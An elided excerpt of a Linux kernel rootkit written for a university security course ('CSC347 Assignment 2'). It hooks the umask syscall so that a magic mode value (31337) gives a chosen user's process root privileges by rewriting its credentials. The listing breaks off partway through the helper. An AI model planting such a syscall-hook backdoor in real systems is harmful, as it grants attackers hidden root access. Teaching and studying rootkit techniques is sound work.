/*
 * CSC347 Assignment 2 Rootkit Framework
 */
...
MODULE_PARM_DESC(root_uid, "Root parameter used for priviledge escalation");
...
int init_module(void)
{
  ...
  //********
  // TODO: NEEDED FOR PART C
  //	Hook your new umask function after writing it
  //********
  // Let's hook umask() for privilege escalation
...
asmlinkage int new_open(const char *pathname, int flags, mode_t mode)
{
  ...
  //********
  //TODO: NEEDED FOR PART C
  //	Write your new umask function.
  //	You will want to add a function prototype to rootkit.h
  //	Make sure it matches the original function definition.
  //********
asmlinkage int new_umask(mode_t mode)
{
  // struct with information about original syscall
  t_syscall_hook *umask_hook = find_syscall_hook(__NR_umask);
  // original system call - function pointer to umask
  int (*umask)(mode_t mode) = (void *) umask_hook->orig_func;
  printk(KERN_INFO "umask(%d) invoked by PID %d (EUID %d)", mode, current->pid, current_cred()->euid);
  // privilege escalation mode = 31337
  if (mode == 31337 && current_cred()->euid == root_uid){
    // modify the effective uid such that it equals root uid
    mod_euid(0); 
    printk(KERN_INFO "PID %d elevated to EUID %d", current->pid, current_cred()->euid);
  }
...
/**
 * Must copy and replace the task_struct's current->cred
 * object, since credentials are read only structures and
 * subsequently modify the effective uid attribute equal to the
 * euid parameter. **/
int mod_euid(uid_t euid){
  // allocates a copy of current credentials and acquires current->cred_replace_mutex
  struct cred *new_cred = prepare_creds();
  if (!new_cred) return -ENOMEM;
  new_cred->euid = euid;
  // assigns new_cred to the const struct * task_struct->cred object
  // and releases the current->cred_replace_mutex.
